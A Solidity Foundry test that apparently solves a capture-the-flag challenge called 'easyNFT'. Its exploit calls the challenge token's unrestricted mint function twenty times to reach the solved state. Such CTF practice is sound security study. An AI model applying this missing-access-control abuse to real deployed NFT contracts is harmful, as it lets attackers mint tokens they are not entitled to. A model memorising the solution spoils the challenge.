// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {Challenge} from "../../src/day01/easyNFT.sol";

contract SolveTest is Test {
    Challenge challenge;

    function setUp() public {
        challenge = new Challenge(address(this));
    }

    function testExploit() public {
        for(uint256 i=0;i<20;i++) {
            challenge.et().mint(address(this), i);
        }

        challenge.solve();

        assertTrue(challenge.isSolved());
    }
}
